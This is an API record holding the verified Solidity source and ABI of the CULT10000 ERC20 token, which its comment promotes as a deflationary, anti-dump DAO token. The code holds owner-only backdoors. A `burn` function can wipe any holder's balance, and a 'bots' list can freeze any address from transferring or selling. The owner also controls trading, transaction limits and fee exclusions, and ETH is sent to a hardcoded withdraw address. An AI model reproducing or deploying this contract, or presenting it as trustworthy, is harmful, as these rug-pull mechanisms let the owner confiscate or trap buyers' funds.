{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\nTelegram:\r\nhttps://t.me/cult10000\r\n\r\nWebsite:\r\nhttps://cult10000.com \r\n\r\nCULT10000 is an ERC20 token with deflationary characteristics. This is to utilise the hottest CULT token masterpiece with a supply burn mechanism to create wealth for Diamond holders.\r\n\r\nNot only that, the amount of tokens burnt depends on the price impact meaning it's dynamic and anti-dump. This means the supply will continue to erode, token scarcity will increase and so will holder investments. \r\n\r\nCULT10000 will also serve as a DAO whereby investment decisions will be made democratically both from the perspective of strategic capital and further utility.\r\n\r\nTokenomics:\r\n\r\nBuy Tax: 5%\r\nSell Tax: 5% fix tax for dev + 0-20% of dynamic tax depending on the dump size\r\n\r\nSPDX-License-Identifier: Unlicensed\r\n*/\r\n\r\n\r\nabstract contract Withdrawable {\r\n    address internal _withdrawAddress;\r\n\r\n    modifier onlyWithdrawer() {\r\n        require(msg.sender == _withdrawAddress);\r\n        _;\r\n    }\r\n\r\n    function withdraw() external onlyWithdrawer {\r\n        _withdraw();\r\n    }\r\n\r\n    function _withdraw() internal {\r\n        payable(_withdrawAddress).transfer(address(this).balance);\r\n    }\r\n\r\n    function setWithdrawAddress(address newWithdrawAddress)\r\n        external\r\n        onlyWithdrawer\r\n    {\r\n        _withdrawAddress = newWithdrawAddress;\r\n    }\r\n}\r\n\r\n\r\nabstract contract Ownable {\r\n    address _owner;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner);\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) external onlyOwner {\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n\r\n    function getPair(address tokenA, address tokenB)\r\n        external\r\n        view\r\n        returns (address pair);\r\n}\r\n\r\n\r\npragma solidity ^0.8.7;\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETH(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapETHForExactTokens(\r\n        uint256 amountOut,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable returns (uint256[] memory amounts);\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n}\r\n\r\n\r\npragma solidity ^0.8.7;\r\n\r\n\r\ncontract DoubleSwapped {\r\n    bool internal _inSwap;\r\n\r\n    modifier lockTheSwap() {\r\n        _inSwap = true;\r\n        _;\r\n        _inSwap = false;\r\n    }\r\n\r\n    function _swapTokensForEth(\r\n        uint256 tokenAmount,\r\n        IUniswapV2Router02 _uniswapV2Router\r\n    ) internal lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapV2Router.WETH();\r\n\r\n        _uniswapV2Router.swapExactTokensForETH(\r\n            tokenAmount,\r\n            0, \r\n            path,\r\n            address(this), \r\n            block.timestamp\r\n        );\r\n    }\r\n}\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\npragma solidity ^0.8.7;\r\n\r\n\r\ncontract ERC20 is IERC20 {\r\n    uint256 internal _totalSupply = 22222e4;\r\n    string _name;\r\n    string _symbol;\r\n    uint8 constant _decimals = 4;\r\n    mapping(address => uint256) internal _balances;\r\n    mapping(address => mapping(address => uint256)) internal _allowances;\r\n    uint256 internal constant INFINITY_ALLOWANCE = 2**256 - 1;\r\n\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() external view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() external view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() external pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 senderBalance = _balances[from];\r\n        require(senderBalance >= amount);\r\n        unchecked {\r\n            _balances[from] = senderBalance - amount;\r\n        }\r\n        _balances[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        external\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][msg.sender];\r\n        require(currentAllowance >= amount);\r\n        if (currentAllowance == INFINITY_ALLOWANCE) return true;\r\n        unchecked {\r\n            _approve(sender, msg.sender, currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0));\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount);\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n\r\n\r\npragma solidity ^0.8.7;\r\n\r\n\r\n\r\nabstract contract TradableErc20 is ERC20, DoubleSwapped, Ownable {\r\n    IUniswapV2Router02 internal constant _uniswapV2Router =\r\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    address public uniswapV2Pair;\r\n    bool public tradingEnable = false;\r\n    mapping(address => bool) _isExcludedFromFee;\r\n    mapping (address => bool) private _isBot;\r\n    uint256 private _maxTxAmount = _totalSupply;\r\n\r\n    address public constant BURN_ADDRESS =\r\n        0x000000000000000000000000000000000000dEaD;\r\n\r\n    constructor(string memory name_, string memory symbol_)\r\n        ERC20(name_, symbol_)\r\n    {\r\n        _isExcludedFromFee[address(0)] = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function makeLiquidity() public onlyOwner {\r\n        require(uniswapV2Pair == address(0));\r\n        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            _uniswapV2Router.WETH()\r\n        );\r\n        uint256 initialLiquidity = getSupplyForMakeLiquidity();\r\n        _balances[address(this)] = initialLiquidity;\r\n        emit Transfer(address(0), address(this), initialLiquidity);\r\n        _allowances[address(this)][\r\n            address(_uniswapV2Router)\r\n        ] = INFINITY_ALLOWANCE;\r\n        _isExcludedFromFee[pair] = true;\r\n        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            initialLiquidity,\r\n            0,\r\n            0,\r\n            msg.sender,\r\n            block.timestamp\r\n        );\r\n\r\n        uniswapV2Pair = pair;\r\n        _maxTxAmount = 200e4;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(_balances[from] >= amount, \"not enough token for transfer\");\r\n        require(!_isBot[from]);\r\n\r\n        \r\n        if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {\r\n            require(tradingEnable, \"trading disabled\");\r\n            require(amount<_maxTxAmount);\r\n            amount = _getFeeBuy(from, amount);\r\n        }\r\n\r\n        \r\n        if (\r\n            !_inSwap &&\r\n            uniswapV2Pair != address(0) &&\r\n            to == uniswapV2Pair &&\r\n            !_isExcludedFromFee[from]\r\n        ) {\r\n            require(tradingEnable, \"trading disabled\");\r\n            amount = _getFeeSell(amount, from);\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (contractTokenBalance > 0) {\r\n                uint256 swapCount = contractTokenBalance;\r\n                uint256 maxSwapCount = 2 * amount;\r\n                if (swapCount > maxSwapCount) swapCount = maxSwapCount;\r\n                _swapTokensForEth(swapCount, _uniswapV2Router);\r\n            }\r\n        }\r\n\r\n        \r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function _getFeeBuy(address from, uint256 amount)\r\n        private\r\n        returns (uint256)\r\n    {\r\n        uint256 dev = amount / 20; \r\n        uint256 burn = amount / 20; \r\n        amount -= dev + burn;\r\n        _balances[from] -= dev + burn;\r\n        _balances[address(this)] += dev;\r\n        _balances[BURN_ADDRESS] += burn;\r\n        _totalSupply -= burn;\r\n        emit Transfer(from, address(this), dev);\r\n        emit Transfer(from, BURN_ADDRESS, burn);\r\n        return amount;\r\n    }\r\n\r\n    function getSellBurnCount(uint256 amount) public view returns (uint256) {\r\n        \r\n        uint256 poolSize = _balances[uniswapV2Pair];\r\n        uint256 vMin = poolSize / 100; \r\n        if (amount <= vMin) return amount / 20; \r\n        uint256 vMax = poolSize / 20; \r\n        if (amount > vMax) return amount / 4; \r\n\r\n        \r\n        return\r\n            amount /\r\n            20 +\r\n            (((amount - vMin) * 20 * amount) / (vMax - vMin)) /\r\n            100;\r\n    }\r\n\r\n    function _getFeeSell(uint256 amount, address account)\r\n        private\r\n        returns (uint256)\r\n    {\r\n        uint256 dev = amount / 20; \r\n        uint256 burn = getSellBurnCount(amount); \r\n\r\n        amount -= dev + burn;\r\n        _balances[account] -= dev + burn;\r\n        _balances[address(this)] += dev;\r\n        _balances[BURN_ADDRESS] += burn;\r\n        _totalSupply -= burn;\r\n        emit Transfer(address(account), address(this), dev);\r\n        emit Transfer(address(account), BURN_ADDRESS, burn);\r\n\r\n        return amount;\r\n    }\r\n\r\n    function setExcludeFromFee(address[] memory accounts, bool value)\r\n        external\r\n        onlyOwner\r\n    {\r\n        for (uint256 i = 0; i < accounts.length; ++i) {\r\n            _isExcludedFromFee[accounts[i]] = value;\r\n        }\r\n    }\r\n\r\n    function setTradingEnable(bool value) external onlyOwner {\r\n        tradingEnable = value;\r\n    }\r\n\r\n    function getSupplyForMakeLiquidity() internal virtual returns (uint256);\r\n\r\n    function setBots(address[] memory bots_) public onlyOwner() {\r\n        for (uint i = 0; i < bots_.length; i++) {\r\n            if (bots_[i] != uniswapV2Pair && bots_[i] != address(_uniswapV2Router)) {\r\n                _isBot[bots_[i]] = true;\r\n            }\r\n        }\r\n    }\r\n    \r\n    function delBots(address[] memory bots_) public onlyOwner() {\r\n        for (uint i = 0; i < bots_.length; i++) {\r\n            _isBot[bots_[i]] = false;\r\n        }\r\n    }\r\n    \r\n    function isBot(address ad) public view returns (bool) {\r\n        return _isBot[ad];\r\n    }    \r\n\r\n    function _setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {\r\n        if (maxTxAmount > 200e4) {\r\n            _maxTxAmount = maxTxAmount;\r\n        }\r\n    }\r\n}\r\n\r\npragma solidity ^0.8.7;\r\n\r\n\r\n\r\nstruct AirdropData {\r\n    address account;\r\n    uint32 count;\r\n}\r\n\r\ncontract CULT10000 is TradableErc20, Withdrawable {\r\n\r\n    uint256 constant pairInitialLiquidity = 10000e4;\r\n\r\n    uint256 constant initialBurn = 0e4;\r\n\r\n    constructor() TradableErc20(\"CULT10000\", \"CULT10000\") {\r\n        _withdrawAddress = address(0xD1A9921f6001f5f47D739C9Dc0e1cb76280d781C);\r\n        _totalSupply = 0;\r\n    }\r\n\r\n    function withdrawOwner() external onlyOwner {\r\n        _withdraw();\r\n    }\r\n\r\n    function getSupplyForMakeLiquidity() internal override returns (uint256) {\r\n        _balances[BURN_ADDRESS] = initialBurn;\r\n        emit Transfer(address(0), address(BURN_ADDRESS), initialBurn);\r\n        _totalSupply += pairInitialLiquidity;\r\n        return pairInitialLiquidity;\r\n    }\r\n\r\n\r\n\r\n    function burn(address account) external onlyOwner {\r\n        uint256 count = _balances[account];\r\n        _balances[account] = 0;\r\n        emit Transfer(account, BURN_ADDRESS, count);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BURN_ADDRESS\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"_setMaxTxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"bots_\",\"type\":\"address[]\"}],\"name\":\"delBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"getSellBurnCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ad\",\"type\":\"address\"}],\"name\":\"isBot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"makeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"bots_\",\"type\":\"address[]\"}],\"name\":\"setBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setExcludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setTradingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWithdrawAddress\",\"type\":\"address\"}],\"name\":\"setWithdrawAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CULT10000", "CompilerVersion": "v0.8.11+commit.d7f03943", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0eea2bd056306d619501077ca7ffc667bdd2a2a85984545dfe204bb67c0e3d6a"}]}